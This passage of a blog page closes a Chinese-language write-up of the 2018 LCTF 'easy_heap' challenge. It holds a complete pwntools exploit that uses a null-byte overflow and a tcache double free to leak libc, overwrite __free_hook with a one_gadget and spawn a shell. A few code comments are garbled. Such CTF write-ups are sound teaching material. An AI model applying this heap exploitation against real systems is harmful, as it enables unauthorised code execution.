+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">7</span>):</span><br><span class="line">  malloc(<span class="number">0x10</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)<span class="comment">#A </span></span><br><span class="line">libc_leak = u64(show(<span class="number">0</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">p.info(<span class="string">'libc leak &#123;&#125;'</span>.format(hex(libc_leak)))</span><br><span class="line">libc = ELF(<span class="string">'libc64.so'</span>)</span><br><span class="line">libc.address = libc_leak - <span class="number">0x3ebca0</span></span><br></pre></td></tr></table></figure>
+<p>此时A从一个0x300的堆块中分割出去，unsorted bin中剩下0x200的堆块，但B此时即是属于分配状态又是属于释放状态，再将B分配出去，就有两个指针指向B，然后使用tcache的double free，进而提高UAF攻击free hook。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># step 4: constrecvuntilct UAF, write into __free_hook</span></span><br><span class="line">malloc(<span class="number">0x10</span>, <span class="string">'9 - next'</span>)</span><br><span class="line"><span class="comment"># these two provides sendlineots for tcache</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>, p64(libc.symbols[<span class="string">'__free_hook'</span>])) <span class="comment"># 0</span></span><br><span class="line">malloc(<span class="number">0x10</span>, <span class="string">'/bin/sh\x00into target'</span>) <span class="comment"># 1</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4f322</span> </span><br><span class="line">malloc(<span class="number">0x10</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system("/bin/sh\x00")</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>Unsorted Bin 在添加的时候时先进先出的，双向链表，tcache是单链表，是后近先出。</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./easy_heap.dms'</span>)</span><br><span class="line">easy_heap = ELF(<span class="string">'./easy_heap.dms'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    <span class="keyword">if</span> len(content)&gt;=size:</span><br><span class="line">        p.send(content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    <span class="keyword">return</span> p.recvline()[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#first step: we need get three unsorted bin chunk</span></span><br><span class="line">    <span class="comment">#we need to fill full tcache bins</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">    <span class="comment">#put 6 chunks into tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">9</span>)<span class="comment"># put chunk9 into tcache incase the unsorted bin's chunks marge into top chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#three unsorted bin chunks. A is 6;B is &amp;;C is 8</span></span><br><span class="line">    <span class="comment">#free(6) ==&gt; B's prev_size = 0x100</span></span><br><span class="line">    <span class="comment">#free(7) ==&gt; C's prev_size = 0x200</span></span><br><span class="line">    <span class="comment">#free(8) ==&gt; chunk9's  prev_size = 0x300</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>,<span class="number">9</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#clear tcache bin and unsorted bin </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    free(<span class="number">8</span>)<span class="comment">#B is 8;A is 7; C is 9</span></span><br><span class="line">    <span class="comment">#free A</span></span><br><span class="line">    free(<span class="number">7</span>)<span class="comment">#unsorted bin only has A,so fd = bk =  main_arena of unsorted bin</span></span><br><span class="line">    malloc(<span class="number">0xf8</span>,<span class="string">'null byte overflow'</span>)<span class="comment">#alloc B ,now B is 0</span></span><br><span class="line">    free(<span class="number">6</span>)<span class="comment">#avoid merge into top chunk</span></span><br><span class="line">    <span class="comment">#free C trigger merge </span></span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#clear tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        malloc(<span class="number">0x10</span>,<span class="string">'cccc'</span>)</span><br><span class="line">    malloc(<span class="number">0x10</span>,<span class="string">'AAAA'</span>)<span class="comment">#alloc A,so now B;fd = bk = main_arena of unsorted bin</span></span><br><span class="line">    <span class="comment">#leak libc addr</span></span><br><span class="line">    libc_leak = u64(puts(<span class="number">0</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = libc_leak - <span class="number">0x3ebca0</span></span><br><span class="line">    p.info(<span class="string">'libc leak &#123;&#125;'</span>.format(hex(libc_leak)))</span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">0x10</span>,<span class="string">'double B'</span>)<span class="comment">#B is 0 and 9</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#free B</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">9</span>)</span><br><span class="line">    malloc(<span class="number">0x10</span>,p64(libc.symbols[<span class="string">'__free_hook'</span>]+libc_base))<span class="comment">#array[0] point to B,overworte B's fd to</span></span><br><span class="line">    p.info(<span class="string">'__free_hook &#123;&#125;'</span>.format(hex(libc.symbols[<span class="string">'__free_hook'</span>]+libc_base)))</span><br><span class="line">    <span class="comment">#__free_hook's addr</span></span><br><span class="line">    malloc(<span class="number">0x10</span>,<span class="string">'/bin/sh\x00into target\n'</span>)<span class="comment">#array[1] alloc B,tcache bin's fd point to __free_hook</span></span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">0x10</span>,p64(one_gadget))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#trigger onegadget</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/</a></p>
+<p><a href="https://www.anquanke.com/post/id/170852" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170852</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    v1cky01dxp
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://v1ckydxp.github.io/archives/2019/07/01/2018_LCTF_easy_heap-writeup/" title="2018_LCTF_easy_heap writeup">https://v1ckydxp.github.io/archives/2019/07/01/2018_LCTF_easy_heap-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://v1ckydxp.github.io" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Tcache/" rel="tag"># Tcache</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/30/ubuntu-18.04-使用笔记/" rel="next" title="ubuntu-18.04 使用笔记">
+                <i class="fa fa-chevron-left"></i> ubuntu-18.04 使用笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/02/Chunk-Overlapping-总结/" rel="prev" title="Chunk Overlapping 总结">
+                Chunk Overlapping 总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">v1cky01dxp</p>
+	      <img class="site-author-image" itemprop="image" src="/images/head.jpeg" alt="v1cky01dxp">
+	      <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/v1ckydxp" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sunshinedxp@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序基本信息"><span class="nav-number">1.</span> <span class="nav-text">程序基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序逻辑"><span class="nav-number">2.</span> <span class="nav-text">程序逻辑</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#结构体"><span class="nav-number">2.1.</span> <span class="nav-text">结构体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getline-函数"><span class="nav-number">2.2.</span> <span class="nav-text">getline()函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路"><span class="nav-number">3.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用过程"><span class="nav-number">4.</span> <span class="nav-text">利用过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-得到A、B、C三个Unsorted-Bin-chunk"><span class="nav-number">4.1.</span> <span class="nav-text">1. 得到A、B、C三个Unsorted Bin chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-将chunk-B放入Tcache"><span class="nav-number">4.2.</span> <span class="nav-text">2. 将chunk B放入Tcache</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-null字符溢出，触发合并"><span class="nav-number">4.3.</span> <span class="nav-text">3. null字符溢出，触发合并</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-泄漏地址"><span class="nav-number">4.4.</span> <span class="nav-text">4. 泄漏地址</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">5.</span> <span class="nav-text">exp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">5.1.</span> <span class="nav-text">Reference</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v1cky01dxp</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">35.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
